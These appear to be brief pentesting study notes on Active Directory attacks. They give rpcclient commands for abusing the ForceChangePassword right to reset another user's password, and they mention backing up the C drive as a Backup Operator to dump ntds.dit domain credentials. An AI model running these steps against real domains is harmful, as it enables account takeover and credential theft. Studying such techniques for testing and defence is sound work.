# ForceChangePassword change user password
can exploit with impacket
payloadsallthethings "Active Directory Attack.md"
```bash
rpcclient $IP -U username -W domain.local
```
within rpcclient shell
```
setuserinfo2 targetuser 23 targetnewpwd
```

# Backup Operators group
permissions to back up files. can back up C drive to dump ntds.dit

# active directory sensitive files
ntds.dit - domain credentials
